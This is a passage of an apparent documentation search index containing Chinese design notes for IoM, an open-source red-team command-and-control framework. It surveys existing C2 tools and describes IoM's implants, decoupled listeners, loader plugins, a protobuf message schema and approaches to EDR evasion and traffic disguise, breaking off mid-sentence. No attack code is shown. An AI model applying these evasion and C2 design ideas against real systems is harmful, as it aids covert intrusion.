\u4e0d\u8bba\u662f\u7532\u65b9\u5efa\u8bbe\u5185\u90e8\u84dd\u519b, \u4ea6\u6216\u662f\u4e3a\u4e86\u7ea2\u84dd\u5bf9\u6297\u9700\u6c42\u7684\u4e59\u65b9\u7ea2\u961f\u6216\u72ec\u7acb\u7ea2\u961f\u90fd\u9700\u8981\u4e00\u5957\u57fa\u7840\u8bbe\u65bd\u6765\u6a21\u62df\u6216\u68c0\u6d4b. \u7ea2\u84dd\u5bf9\u6297\u7684\u6548\u679c\u662f\u8fdc\u8fdc\u4f18\u4e8e\u4f9d\u8d56\u50f5\u786c\u7684 playbook \u7684 BAS \u7684.</p> <p>\u8fd1\u5e74\u6765\u5927\u578b\u4f01\u4e1a\u90fd\u5efa\u7acb\u4e86\u81ea\u5df1\u7684\u84dd\u519b, \u4f46\u5b89\u5168\u884c\u4e1a\u53ea\u63d0\u4f9b\u9632\u62a4\u7c7b\u4ea7\u54c1, \u84dd\u519b\u9762\u4e34\u7740\u5149\u6709\u4eba, \u5176\u4ed6\u7684\u4e00\u5207\u90fd\u5f97\u81ea\u5df1\u642d\u5efa\u7684\u56f0\u96be</p>"},{"location":"IoM/design/#\u751f\u6001","title":"\u751f\u6001","text":"<p>https://howto.thec2matrix.com/ \u8c03\u7814\u4e86\u8f83\u4e3a\u4e3b\u6d41\u7684 C2 \u6846\u67b6.</p> <p>\u57fa\u4e8e\u81ea\u8eab\u7684\u7ecf\u9a8c, \u4e5f\u5bf9\u6211\u4f7f\u7528\u8fc7\u7684\u6846\u67b6\u7b80\u5355\u603b\u7ed3\u4f18\u7f3a\u70b9.</p>"},{"location":"IoM/design/#\u56fd\u5916\u5546\u4e1a\u5316\u4ea7\u54c1","title":"\u56fd\u5916\u5546\u4e1a\u5316\u4ea7\u54c1","text":"<ul> <li>CobaltStrike \u5f00\u53d1\u5546 outfrank, \u8fd1\u4e9b\u5e74\u6700\u6d41\u884c\u7684 C2 \u6846\u67b6, \u51ed\u501f\u7740\u65b9\u4fbf\u7684 GUI, \u6781\u9ad8\u7684\u62d3\u5c55\u6027, \u793e\u533a\u4ee5\u53ca\u4e8c\u5f00\u4fbf\u5229\u4f18\u52bf\u62ff\u4e0b\u4e86\u6700\u9ad8\u7684\u5e02\u573a\u5360\u6709\u7387. \u5e76\u6709\u4e00\u7cfb\u5217\u7684\u76f8\u5173\u9886\u57df\u7684\u5de5\u5177\u94fe, https://www.outflank.nl/products/outflank-security-tooling/ . \u968f\u7740 4.5 \u7248\u672c\u7684\u6e90\u7801\u6cc4\u9732, \u6709\u8d8a\u6765\u8d8a\u591a\u7684\u57fa\u4e8e\u5176\u6e90\u7801\u4e8c\u5f00\u7684\u6846\u67b6.</li> <li>Metasploit \u5f00\u53d1\u5546 rapid7, \u62e5\u6709\u6700\u5168\u9762\u7684 exploit \u4e0e post-exploit \u6846\u67b6, \u5e02\u9762\u4e0a\u80fd\u89c1\u5230\u7684\u7edd\u5927\u90e8\u5206\u81ea\u7814 C2 \u4e0d\u662f\u57fa\u4e8e CS \u4e8c\u5f00\u5c31\u662f\u57fa\u4e8e MSF \u4e8c\u5f00. \u4f46\u4e5f\u56e0\u4e3a\u8fc7\u4e8e\u7b28\u91cd\u4ee5\u53ca\u5728 teamserver \u65b9\u9762\u7684\u52a3\u52bf, \u5728\u5b9e\u6218\u4e2d\u5e76\u4e0d\u5e38\u89c1. \u6709\u4e00\u4e2a\u57fa\u4e8e MSF \u7684 teamserver \u4e0e gui \u5316\u7684\u5f00\u6e90\u9879\u76ee https://github.com/FunnyWolf/Viper</li> <li>nighthawk \u6765\u81ea\u82f1\u56fd\u7684\u5546\u4e1a\u5316 C2 \u6846\u67b6, \u4e13\u6ce8 opsec, \u4f46\u56e0\u4e3a\u65e0\u516c\u5f00\u6d41\u51fa\u7248\u672c, \u6ca1\u6709\u6df1\u5ea6\u4f53\u9a8c.</li> <li>bruteratel \u6765\u81ea\u7f8e\u56fd\u5546\u4e1a C2 \u6846\u67b6, \u8fd1\u671f\u6709\u6d41\u51fa\u7248\u672c, \u6709\u88ab apt,\u52d2\u7d22\u7ec4\u7ec7\u4f7f\u7528\u6848\u4f8b.</li> </ul>"},{"location":"IoM/design/#\u5f00\u6e90\u751f\u6001","title":"\u5f00\u6e90\u751f\u6001","text":"<ul> <li>sliver \u5f00\u53d1\u5546 bishopfox. \u4e00\u4e2a\u65b0\u5174\u7684\u5f00\u6e90 C2. \u62e5\u6709\u8bb8\u591a\u72ec\u7279\u7684\u529f\u80fd, \u4f8b\u5982 cursed, \u5bc6\u7801\u5b66\u5b89\u5168\u7684\u6d41\u91cf\u7279\u6027\u7b49, \u4ee5\u53ca\u81ea\u5df1\u7684\u751f\u6001 armory.</li> <li>havoc implant \u57fa\u4e8e C \u5f00\u53d1, \u901a\u8fc7\u517c\u5bb9 BOF \u83b7\u5f97\u4e86\u4e0d\u5c11 CS \u7684\u80fd\u529b.</li> <li>mythic \u672c\u8d28\u4e0a\u662f\u4e00\u5957\u901a\u8baf\u534f\u8bae\uff0c \u5b9e\u73b0\u4e86\u8fd9\u4e2a\u901a\u8baf\u534f\u8bae\u7684 agent \u53ef\u4ee5\u4e0e\u8fd9\u4e2a\u6846\u67b6\u4ea4\u4e92.</li> </ul>"},{"location":"IoM/design/#\u5c0f\u7ed3","title":"\u5c0f\u7ed3","text":"<p>\u4ece\u57fa\u7840\u529f\u80fd\u4e0a\u6765\u8bf4, \u57fa\u672c\u529f\u80fd\u4e4b\u95f4\u5927\u540c\u5c0f\u5f02, \u7a33\u5b9a\u8fd0\u884c\u7684 implant, \u9002\u5408\u56e2\u961f\u534f\u4f5c\u7684 teamserver, \u4fbf\u5229\u7684\u5ba2\u6237\u7aef. \u5546\u4e1a\u5316\u5de5\u5177\u4e0e\u5f00\u6e90\u5de5\u5177\u6700\u5927\u7684\u533a\u522b\u662f\u5728 OPSEC \u4e0a, \u5176\u4e2d\u505a\u5f97\u6bd4\u8f83\u597d\u7684\u662f nighthawk \u4e0e cobaltstrike, \u4ed6\u4eec\u62e5\u6709\u5927\u91cf\u672a\u516c\u5f00\u7684 EDR \u5bf9\u6297\u6280\u672f, \u5e76\u6709\u826f\u597d\u7684\u5de5\u7a0b\u5316\u4e0e\u81ea\u5b9a\u4e49\u65b9\u6848\u3002</p> <p>\u800c\u5728\u56fd\u5185\u5e76\u4e0d\u7f3a\u5c11\u5355\u72ec\u7684 EDR \u5bf9\u6297\u6280\u672f, \u6709\u5927\u91cf\u516c\u5f00\u6216\u672a\u516c\u5f00\u7684\u6280\u672f\u5728\u5f00\u6e90\u4e16\u754c\u6216\u8005\u79c1\u4e0b\u6d41\u4f20, \u4f46\u7f3a\u5c11\u4e00\u4e2a\u53ef\u4ee5\u9ad8\u5ea6\u5b9a\u5236\u5316\u7684\u6846\u67b6\u5c06\u8fd9\u4e9b\u72ec\u7acb\u7684\u6280\u672f\u5de5\u7a0b\u5316, \u4f7f\u5176\u53d8\u6210\u4e00\u4e2a\u7edf\u4e00\u7684\u57fa\u7840\u8bbe\u65bd.</p> <p>nighthawk \u4e0e cobaltstrike \u90fd\u662f\u95ed\u6e90\u7684\u5de5\u5177, \u4ed6\u4eec\u867d\u7136\u63d0\u4f9b\u4e86\u5404\u79cd\u63a5\u53e3\u4ee5\u4f9b\u7528\u6237\u5ba2\u5236\u5316, \u4f46\u5728\u6700\u6838\u5fc3\u7684\u90e8\u5206, \u56e0\u4e3a\u7f3a\u5c11\u4ee3\u7801, \u53ea\u80fd\u4f9d\u8d56\u5176\u5b98\u65b9\u8fed\u4ee3. \u5e76\u4e14 nighthawk \u4e0e cobaltstrike \u90fd\u6709\u4e25\u683c\u7684\u5bf9\u4e2d\u56fd\u51fa\u53e3\u9650\u5236.</p> <p>\u6700\u91cd\u8981\u7684\u662f, \u56fd\u5185\u7684\u73af\u5883\u8bde\u751f\u4e86\u4e00\u7cfb\u5217\u5f3a\u5927\u7684 webshell \u7ba1\u7406\u5de5\u5177, \u4ed6\u4eec\u5b9e\u9645\u4e0a\u4e5f\u662f\u67d0\u79cd\u610f\u4e49\u4e0a\u7684 C2, \u4ece\u5de5\u7a0b\u4e0a\u6765\u770b, \u7406\u8bba\u4e0a\u80fd\u5b8c\u5168\u590d\u7528 C2 \u7684\u540e\u6e17\u900f\u57fa\u5efa.</p> <p>\u53ef\u4ee5\u60f3\u8c61\u4e00\u4e2a\u80fd\u8c03\u7528 cobaltstrike \u7684 cna \u811a\u672c\u7684\u51b0\u978b/\u54e5\u65af\u62c9\u6709\u591a\u4e48\u5f3a\u5927!</p> <p>\u5b89\u5168\u7684\u5bf9\u6297\u51e0\u4e4e\u90fd\u96c6\u4e2d\u5728 post-exploit \u4e0a, \u5728 pre-exploit \u4e0a, \u9632\u5b88\u65b9\u80fd\u505a\u7684\u53ea\u6709\u6536\u655b\u653b\u51fb\u9762\uff0c \u5728 exploit \u5bf9\u6297\u4e0a\u53ea\u80fd\u505a\u597d VM(\u6f0f\u6d1e\u7ba1\u7406) \u89e3\u51b3 1day/nday \u95ee\u9898\u3002 \u8fd9\u4e24\u8005\u52a0\u8d77\u6765, \u90fd\u5bf9 0day \u65e0\u80fd\u4e3a\u529b, WAF \u8fd9\u7c7b\u6d41\u91cf\u8bbe\u5907\u8fdb\u884c\u7684\u62b5\u6297\u4e0d\u8db3\u4e3a\u60e7, \u771f\u6b63\u80fd\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u662f\u5728 post-exploit \u8fc7\u7a0b\u4e2d\u7684\u5bf9\u6297. post-exploit \u5bf9\u6297\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u4e86\u7eb5\u6df1\u9632\u62a4, \u6001\u52bf\u611f\u77e5, \u96f6\u4fe1\u4efb\u7b49\u7b49\u65b9\u6cd5, \u51fa\u73b0\u4e86\u957f\u957f\u7684\u4e00\u7cfb\u5217\u4ea7\u54c1, \u5168\u90fd\u662f\u7528\u6765\u4e0e C2 \u5bf9\u6297. \u6240\u4ee5 C2 \u662f\u7ea2\u84dd\u53cc\u65b9\u4e89\u593a\u6700\u6fc0\u70c8\u6700\u91cd\u8981\u7684\u9ad8\u5730.</p>"},{"location":"IoM/design/#\u67b6\u6784architecture","title":"\u67b6\u6784/architecture","text":"<p>\u8fdb\u653b\u662f\u6700\u597d\u7684\u9632\u5fa1.</p> <p>Internet of Malice(\u6076\u8054\u7f51) \u529b\u56fe\u5b9e\u73b0\u4e00\u5957 post-exploit \u57fa\u7840\u8bbe\u65bd, \u5728\u517c\u5bb9 CS,MSF,Sliver \u751f\u6001\u7684\u540c\u65f6, \u63d0\u4f9b\u66f4\u9ad8\u7684\u62d3\u5c55\u6027\u4e0e\u9690\u853d\u6027, \u5e76\u63d0\u4f9b\u4e00\u5957\u5de5\u7a0b\u5316\u7684\u89e3\u51b3\u65b9\u6848.</p> <p>\u7ec4\u4ef6(WIP \u4e3a\u76ee\u524d\u5c1a\u672a\u5b9e\u73b0\u7684\u90e8\u5206):</p> <ul> <li>server \u6570\u636e\u5904\u7406\u4e0e\u4ea4\u4e92\u670d\u52a1</li> <li>\u76d1\u542c\u5668(listener), \u4e0e server \u89e3\u8026, \u53ef\u4ee5\u72ec\u7acb\u4e8e server \u5355\u72ec\u90e8\u7f72<ul> <li>\u53cd\u5411\u8fde\u63a5\u5668, \u7528\u6765\u63a5\u6536\u53cd\u8fde\u6570\u636e</li> <li>\u6b63\u5411\u8fde\u63a5\u5668, \u7528\u6765\u8fde\u63a5 webshell \u6216\u8005\u6b63\u5411\u8fde\u63a5\u7684 implant (v0.0.3 done)</li> <li>\u5f00\u653e\u63a5\u53e3, \u652f\u6301\u7b2c\u4e09\u65b9implant/webshell</li> </ul> </li> <li>\u690d\u5165\u7269(implant), \u5e76\u80fd\u63a5\u53d7\u4efb\u610f\u8bed\u8a00\u7f16\u5199\u7684\u63d2\u4ef6<ul> <li>\u57fa\u4e8e rust \u7684\u5168\u5e73\u53f0\u53cd\u5411\u690d\u5165\u7269</li> <li>\u57fa\u4e8e webshell \u7684\u6b63\u5411\u690d\u5165\u7269 webshell (v0.1.0)</li> <li>loader generator (v0.0.4 done)</li> <li>ollvm \u7f16\u8bd1\u5668 (v0.1.0 WIP)</li> <li>bind (v0.0.3 done)</li> </ul> </li> <li>client<ul> <li>cli</li> <li>gui (v0.1.0 WIP)</li> </ul> </li> <li>\u63d2\u4ef6\u751f\u6001<ul> <li>implant \u7aef\u63d2\u4ef6<ul> <li>armory, sliver \u7684\u63d2\u4ef6\u751f\u6001</li> <li>BOF, cobaltstrike \u7684 bof \u63d2\u4ef6\u751f\u6001</li> <li>dynamic module, IoM \u81ea\u8eab\u7684\u63d2\u4ef6\u751f\u6001</li> <li>UDRL, DLL loader</li> <li>HeadlessPE, PEloader</li> <li>CRL(C# loader)</li> <li>Unmanaged powershell</li> <li>shellcode</li> </ul> </li> <li>server/client \u7aef\u63d2\u4ef6<ul> <li>\u57fa\u4e8elua/go\u5b9e\u73b0\u7684\u52a8\u6001\u63d2\u4ef6\u8bed\u8a00 [mals](https://github.com/chainreactors/mals</li> <li>\u57fa\u4e8egrpc\u751f\u6210\u7684\u591a\u8bed\u8a00SDK</li> </ul> </li> </ul> </li> </ul>"},{"location":"IoM/design/#\u8bbe\u8ba1","title":"\u8bbe\u8ba1","text":"<p>\u5f53\u6211\u4eec\u771f\u6b63\u5f00\u59cb\u7740\u624b\u53bb\u5b9e\u73b0\u65f6, \u9047\u5230\u7684\u56f0\u96be\u6bd4\u60f3\u8c61\u591a\u5f97\u591a.</p> <p>\u6211\u8c03\u7814\u4e86\u5f00\u6e90\u4e16\u754c\u4e2d\u5927\u90e8\u5206\u77e5\u540d C2 \u7684\u67b6\u6784\u4e0e\u5b9e\u73b0, 80%\u4ee5\u4e0a C2 \u5b9e\u9645\u4e0a\u53ea\u5b9e\u73b0\u4e86\u547d\u4ee4\u6267\u884c, \u4e0a\u4f20\u4e0b\u8f7d. \u8bf4\u5b9e\u8bdd\u5f88\u96be\u79f0\u5f97\u4e0a\u662f C2.</p> <p>\u4f46\u4e5f\u53d1\u73b0\u4e86\u6709\u51e0\u4e2a\u5b9e\u73b0\u975e\u5e38\u6210\u719f\u7684, \u4ece\u67b6\u6784\u4e0e\u8bbe\u8ba1\u4e0a\u90fd\u975e\u5e38\u4f18\u96c5\u7684\u6846\u67b6. \u4e5f\u5c31\u662f\u5728\u80cc\u666f\u4e2d\u63d0\u5230\u8fc7\u7684 sliver, havoc, mythic. \u8fd9\u4e09\u4e2a\u6846\u67b6\u7684\u67b6\u6784\u5b8c\u5168\u4e0d\u540c, \u5404\u6709\u5404\u7684\u4f18\u7f3a\u70b9. \u5176\u4e2d sliver \u662f\u6700\u5e74\u8f7b\u7684\u6846\u67b6, \u5176\u67b6\u6784\u4e5f\u662f\u6700\u7b26\u5408\u73b0\u4ee3\u8bbe\u8ba1\u7406\u5ff5\u7684 C2 \u6846\u67b6.</p> <p>\u6838\u5fc3\u7684\u7406\u5ff5\uff1a</p> <ul> <li>\u5f7b\u5e95\u7684\u89e3\u8026\uff0c implant\u5728\u7f16\u8bd1\u5668\u53ef\u7ec4\u88c5\u53ef\u52a8\u6001\u52a0\u8f7d</li> <li>\u7a77\u5c3d\u6781\u9650\u7684\u53ef\u62d3\u5c55\u6027\uff0c \u5c06\u4ee3\u7801\u5c01\u88c5\u6210\u9ad8\u5ea6\u6a21\u677f\u5316\u7684\uff0c\u5728client/server/implant\u90fd\u80fd\u5feb\u901f\u6dfb\u52a0\u65b0\u7684\u529f\u80fd\uff0c\u4ee5\u53ca\u901a\u8fc7lua\u63d2\u4ef6\u5b9e\u73b0\u7684\u52a8\u6001\u62d3\u5c55</li> <li>OPSEC\u4f18\u5148\uff0c \u867d\u7136\u5f00\u6e90\u4e0eOPSEC\u51b2\u7a81\uff0c \u4f46\u662f\u6211\u4eec\u505a\u4e86\u5145\u5206\u7684OPSEC\u51c6\u5907\uff0c \u57fa\u4e8e\u6211\u4eec\u7684\u9ad8\u5ea6\u89e3\u8026\u4e0e\u53ef\u62d3\u5c55\u6027\uff0c \u6240\u6709\u7684\u529f\u80fd\u90fd\u53ef\u4ee5\u5feb\u901f\u8f6c\u6362\u4e3aOPSEC\u7248\u672c</li> </ul>"},{"location":"IoM/design/#\u901a\u8baf\u8bbe\u8ba1","title":"\u901a\u8baf\u8bbe\u8ba1","text":"<p>sliver \u7684 implant/client/server \u90fd\u901a\u8fc7 go \u5b9e\u73b0, \u5e76\u4f7f\u7528 grpc \u4f5c\u4e3a\u5176\u901a\u8baf\u534f\u8bae.</p> <p>client \u4e0e server \u901a\u8fc7 protobuf \u63d0\u4f9b\u7684 rpc \u901a\u8baf, server \u4e0e implant \u901a\u8baf\u5219\u662f\u5c06\u6570\u636e\u5305\u5c01\u88c5\u4e3a\u7edf\u4e00\u7684<code>Envelope</code> message, \u7136\u540e\u5bf9<code>Envelope</code>\u7684 Data \u548c Type \u5b57\u6bb5\u8fdb\u884c\u4e8c\u6b21\u7684\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c, \u83b7\u5f97\u771f\u6b63\u7684\u6570\u636e. \u518d\u5728\u5404\u7aef\u4e4b\u95f4\u52a0\u4e0a mtls, \u5bf9\u6d41\u91cf\u8fdb\u884c\u52a0\u5bc6.</p> <p>implant \u7aef\u5219\u901a\u8fc7\u4e00\u4e2a<code>handler</code>\u53bb\u5206\u53d1\u6570\u636e\u5230\u5404\u4e2a\u6a21\u5757, \u6a21\u5757\u7684\u6267\u884c\u7ed3\u679c\u540c\u6837\u901a\u8fc7<code>Envelope</code>\u8fd4\u56de\u5230 server \u4e2d.</p> <p>sliver \u7684\u591a\u4fe1\u9053\u652f\u6301\u57fa\u4e8e go \u975e\u5e38\u4f18\u96c5\u7684 conn \u76f8\u5173\u7684\u62bd\u8c61, \u670d\u52a1\u7aef\u53ea\u9700\u8981\u5b9e\u73b0<code>listener</code>\u548c<code>accept</code>, \u5728 implant \u5b9e\u73b0<code>dialer</code>. \u5c31\u80fd\u8ba9\u5b9e\u9645\u7684\u901a\u8baf\u534f\u8bae\u9690\u85cf\u5728<code>conn</code>\u4e0b, \u5927\u90e8\u5206 go \u7684\u4ee3\u7406\u5de5\u5177\u4e5f\u662f\u90fd\u662f\u8fd9\u6837\u8bbe\u8ba1. \u53ef\u4ee5\u5f88\u5feb\u62d3\u5c55\u51fa\u5404\u79cd\u5404\u6837\u7684\u901a\u8baf\u4fe1\u9053. \u8fd9\u4e00\u70b9 go \u5bf9\u6bd4\u5176\u4ed6\u8bed\u8a00\u7684\u4f18\u52bf\u975e\u5e38\u5927. \u73b0\u5728\u7684 sliver \u4e0d\u652f\u6301 icmp \u4fe1\u9053, \u4f46\u662f\u5982\u679c\u60f3\u8981\u62d3\u5c55, \u51e0\u4e4e\u4e0d\u9700\u8981\u4ec0\u4e48\u4fee\u6539, \u4e24\u4e09\u884c\u7684\u4fee\u6539\u5373\u53ef\u8fd0\u4f5c.</p> <p>sliver \u9ed8\u8ba4\u63d0\u4f9b\u7684\u662f\u6b63\u5411\u94fe\u63a5, \u5e76\u901a\u8fc7 mtls \u52a0\u5bc6. \u5b83\u7684 beacon(\u53cd\u5411\u8fde\u63a5)\u5e76\u4e0d\u5982\u6b63\u5411\u7a33\u5b9a.</p> <p>\u800c sliver \u6700\u4f18\u96c5\u7684\u8bbe\u8ba1\u5c31\u662f\u8fd9\u4e00\u5957\u901a\u8baf\u8bbe\u8ba1. \u6211\u4eec\u6cbf\u7528\u5176\u90e8\u5206\u8bbe\u8ba1, \u4f8b\u5982 implant/client/server \u4e4b\u95f4\u7684\u901a\u8baf\u901a\u8fc7 protobuf \u5b9a\u4e49. \u4f46\u6211\u4eec\u6ca1\u6709\u4f7f\u7528<code>Envelope</code>\u8fd9\u79cd\u9700\u8981\u4e24\u6b21\u53cd\u5e8f\u5217\u5316\u7684\u8bbe\u8ba1. \u800c\u662f\u91c7\u7528\u4e86 protobuf3 \u63d0\u4f9b\u7684<code>oneof</code>\u5b9e\u73b0\u4e86\u7c7b\u4f3c\u7684\u529f\u80fd. \u5c31\u50cf\u8fd9\u6837:</p> <pre><code>message Spite {\n  string name = 1;\n  uint32 task_id = 2;\n  bool  async = 3;\n  uint64 timeout = 4;\n  uint32 error = 5;\n  Status status = 6;\n\n  oneof body {\n    Empty empty = 10;\n    Block block = 11;\n    AsyncACK async_ack = 13;\n    Register register = 21;\n    Ping ping = 22;\n    Suicide suicide = 23;\n    Request request = 24;\n    Response response = 25;\n    LoadModule  load_module = 31;\n    Modules  modules = 32;\n    Extensions extensions = 40;\n    LoadExtension load_extension = 41;\n    ExecuteExtension execute_extension = 42;\n    ...\n  }\n}\n</code></pre>"},{"location":"IoM/design/#\u89e3\u8026-listener","title":"\u89e3\u8026 Listener","text":"<p>\u628a server \u548c listener \u653e\u5728\u4e00\u8d77\u662f\u5f88\u5371\u9669\u7684\u884c\u4e3a. \u73b0\u4ee3\u5316\u7684 C2 \u8bbe\u8ba1\u4e2d, \u5f88\u5e38\u89c1\u7684\u9009\u62e9\u662f\u6dfb\u52a0\u4e00\u4e2a<code>redirector</code>, \u7528\u6765\u8f6c\u53d1\u6570\u636e\u6765\u5b9e\u73b0\u56de\u8fde\u7684\u5206\u5e03\u5f0f. \u4f46\u53ef\u80fd\u4f1a\u9762\u4e34\u8fd9\u6837\u4e00\u4e2a\u95ee\u9898, <code>redirector</code>\u53ea\u80fd\u8f6c\u53d1\u539f\u6837\u7684\u6570\u636e, \u65e2\u7136\u5df2\u7ecf\u88ab\u53d1\u73b0\u4e86, \u539f\u672c\u7684\u6d41\u91cf\u7279\u5f81\u5f88\u6709\u53ef\u80fd\u5df2\u7ecf\u88ab\u8bc6\u522b\u4e86, \u5c31\u7b97\u901a\u8fc7<code>redirector</code>\u81ea\u52a8\u5207\u6362\u5907\u7528\u7ebf\u8def\u6216\u8005\u57df\u524d\u7f6e, \u4e5f\u9003\u4e0d\u8fc7\u518d\u6b21\u5e94\u6025. <code>redirector</code>\u7684\u4f5c\u7528\u5c31\u53ea\u662f\u9690\u85cf\u771f\u5b9e\u7684 server \u5730\u5740, \u80fd\u4e0d\u80fd\u505a\u5f97\u66f4\u591a\u5462?</p> <p>\u53ea\u9700\u8981\u6362\u4e2a\u601d\u8def, \u65e2\u7136\u8f6c\u53d1\u5668\u4e0d\u9002\u5408, \u90a3\u5c31\u76f4\u63a5\u90e8\u7f72 Listener, \u662f\u4e00\u4e2a\u6709\u5b8c\u6574\u6570\u636e\u89e3\u6790\u5904\u7406\u80fd\u529b\u7684\u8fb9\u7f18\u8282\u70b9. \u65e2\u53ef\u4ee5\u5b9e\u73b0\u9690\u85cf\u4e3b\u670d\u52a1\u5668, \u4e5f\u53ef\u80fd\u505a\u5f97\u66f4\u591a. \u4f8b\u5982, \u5f53\u4e00\u4e2a<code>redirector</code> \u53d1\u751f\u65ad\u8054\u65f6, implant \u4f1a\u5c1d\u8bd5\u4f7f\u7528\u5b8c\u5168\u4e0d\u540c\u7684\u534f\u8bae\u8fde\u63a5\u5230\u5907\u7528\u7684 listener \u4e2d. \u8fd9\u4e2a\u5b8c\u5168\u4e0d\u540c\u7684\u534f\u8bae\u53ef\u4ee5\u662f\u534f\u8bae\u7279\u5f81\u4e0d\u540c, \u4e5f\u53ef\u4ee5\u534f\u8bae\u7684\u4f20\u8f93\u5c42\u90fd\u4e0d\u540c.</p> <p>\u89e3\u8026\u51fa\u6765\u7684 Listener \u8fd8\u53ef\u4ee5\u505a\u5f97\u66f4\u591a, \u5728 IoM \u7684\u6574\u4f53\u8bbe\u8ba1\u4e2d\u5305\u542b\u4e86 webshell \u76f8\u5173\u7684\u529f\u80fd, Listener \u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u6d41\u91cf\u7684\u51fa\u53e3\u8282\u70b9\u5b9e\u73b0\u4e0e webshell \u4ea4\u4e92\u7684\u76f8\u5173\u529f\u80fd.</p>"},{"location":"IoM/design/#\u81ea\u5b9a\u4e49parser","title":"\u81ea\u5b9a\u4e49parser","text":"<p>\u65e2\u7136listener\u5df2\u7ecf\u89e3\u8026\u51fa\u6765\u4e86\uff0c \u4e3a\u4ec0\u4e48\u4e0d\u80fd\u66f4\u8fdb\u4e00\u6b65\u3002 \u6211\u4eec\u4e0d\u5fc5\u8981\u6c42implant\u4e0elistener\u7684\u901a\u8baf\u534f\u8bae\u6709\u4efb\u4f55\u56fa\u5b9a\u7684\u683c\u5f0f\u3002\u53ea\u9700\u8981\u5728implant\u548clistener\u4e0a\u5b9e\u73b0\u5404\u81ea\u7684marshal\u4e0eparse\u5373\u53ef\u5904\u7406\u4efb\u610f\u7684\u901a\u8baf\u534f\u8bae\u3002 </p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u8fd9\u91cc\u6307\u7684parser\u662f\u627f\u8f7d\u5728\u4f20\u8f93\u5c42\u4e0a\u7684\uff0c \u4e0d\u540c\u7684parser\u4e0e\u4e0d\u540c\u7684\u4f20\u8f93\u5c42\u662f\u4e92\u76f8\u89e3\u8026\u7684\u3002 \u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u7684parser\u642d\u914d\u4efb\u610f\u7684\u4f20\u8f93\u5c42\u534f\u8bae\u3002</p> <p>\u53ea\u9700\u8981\u5bf9\u5916\u66b4\u9732\u4e00\u7ec4\u63a5\u53e3\uff0c \u5373\u53ef\u7ecf\u8fc7\u7b80\u5355\u7684\u4fee\u6539\u5b9e\u73b0\u4efb\u610f\u7684\u534f\u8bae. \u5b9e\u9645\u4e0a\uff0c \u6211\u4eec\u7684pulse(stager)\u4e0emalefic(stageless) \u4f7f\u7528\u7684\u5c31\u662f\u6709\u4e00\u4e9b\u4e0d\u540c\u7684\u534f\u8bae\u3002</p> <p>\u5230\u4e86\u8fd9\u4e00\u6b65\uff0c \u518d\u62d3\u5c55\u4e00\u4e0b\u601d\u8def\uff0c\u6211\u4eec\u53ea\u9700\u8981\u6309\u7167Cobaltstrike \u7684external\u7684\u534f\u8bae\u5b9e\u73b0\u5bf9\u5e94\u7684parser\u5e76\u5c06\u6d41\u91cf\u8f6c\u53d1\u81f3CS\u7684teamserver\uff0c \u6211\u4eec\u7684listener\u4e5f\u53ef\u4ee5\u5f53\u4f5cCS\u7684external C2.</p> <p>\u4e0d\u8fc7\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6d41\u91cf\u5c42\u9762\u7684\u5bf9\u6297\u4e0d\u6b62\u662f\u5728\u8fd9\u4e00\u5c42\u9762\u8fdb\u884c\u3002 \u53ef\u4ee5\u9605\u8bfb\u540e\u7eed\u7684\u7ae0\u8282\u3002 </p>"},{"location":"IoM/design/#\u7aef\u4e0a\u5bf9\u6297-partially-completed","title":"\u7aef\u4e0a\u5bf9\u6297 (partially completed)","text":"<p>\u73b0\u4ee3 C2 \u6846\u67b6\u6700\u91cd\u8981\u7684\u662f\u5982\u4f55\u8bbe\u8ba1 opsec \u76f8\u5173\u529f\u80fd. \u5728 IoM \u4e2d, \u6211\u4eec\u5b9e\u73b0\u4e86 cobaltstrike \u80fd\u63d0\u4f9b\u7684\u7edd\u5927\u90e8\u5206\u7528\u4e8e opsec \u7684\u5bf9\u6297. \u5e76\u52a0\u5165\u4e86\u66f4\u591a\u7684\u6211\u4eec\u81ea\u5df1\u7684\u60f3\u6cd5.</p> <p>\u73b0\u4ee3 EDR\uff08\u7aef\u4e0a\u68c0\u6d4b\u4e0e\u54cd\u5e94\u7cfb\u7edf\uff09\u5df2\u7ecf\u80fd\u67e5\u6740\u7edd\u5927\u591a\u6570\u7684\u6076\u610f\u884c\u4e3a, \u4ece\u9759\u6001\u67e5\u6740\u3001\u7b26\u53f7\u6267\u884c\u3001HOOK\u3001\u6c99\u7bb1\u7b49\u7b49\u624b\u6bb5\u5168\u65b9\u4f4d\u7684\u9632\u62a4\u6076\u610f\u8f6f\u4ef6. \u516c\u5f00\u7684\u624b\u6bb5\u5f88\u96be\u8eb2\u907f\u73b0\u4ee3 EDR \u7684\u67e5\u6740. \u800c\u540e\u6e17\u900f\u4f7f\u7528\u5230\u4e86\u5927\u91cf\u654f\u611f\u5371\u9669\u7684\u64cd\u4f5c, \u4f7f\u5f97\u884c\u52a8\u5f88\u5bb9\u6613\u66b4\u9732\u5728\u5b89\u5168\u8bbe\u5907\u4e2d.</p> <p>\u90e8\u5206 C2 \u4e3a\u4e86\u9632\u6b62\u88ab EDR \u67e5\u6740, \u9009\u62e9\u91c7\u7528\u53ea\u6709\u6267\u884c\u547d\u4ee4\u3001\u4e0a\u4f20\u3001\u4e0b\u8f7d\u7684\u5148\u950b\u9a6c\u8fdb\u884c\u64cd\u4f5c, \u653e\u5f03\u4e86\u7edd\u5927\u591a\u6570\u80fd\u529b, \u4f46\u4e0d\u4e00\u5b9a\u662f\u6240\u6709\u573a\u666f\u7684\u6700\u4f73\u9009\u62e9, \u4e3a\u4e86\u4e0e\u73b0\u4ee3\u5316\u7684 EDR \u5bf9\u6297\uff0c\u66f4\u5e94\u8be5\u91c7\u7528\u73b0\u4ee3\u5316\u7684\u6b66\u5668\u67b6\u6784\u4e0e\u80fd\u529b\uff0c\u5c3d\u53ef\u80fd\u7684\u5728\u4fdd\u7559\u529f\u80fd\u7684\u60c5\u51b5\u4e0b\u89c4\u907f EDR \u7684\u67e5\u6740\u3002\u63d0\u9ad8\u64cd\u4f5c\u8005\u7684\u6548\u7387\u4e0e\u80fd\u529b\u3002</p> <p>\u7aef\u4e0a\u5bf9\u6297\u7684\u6548\u679c\u5f88\u5927\u7a0b\u5ea6\u4e0a\u4f9d\u8d56\u4e8e\u95ed\u6e90, IoM \u7684 implant 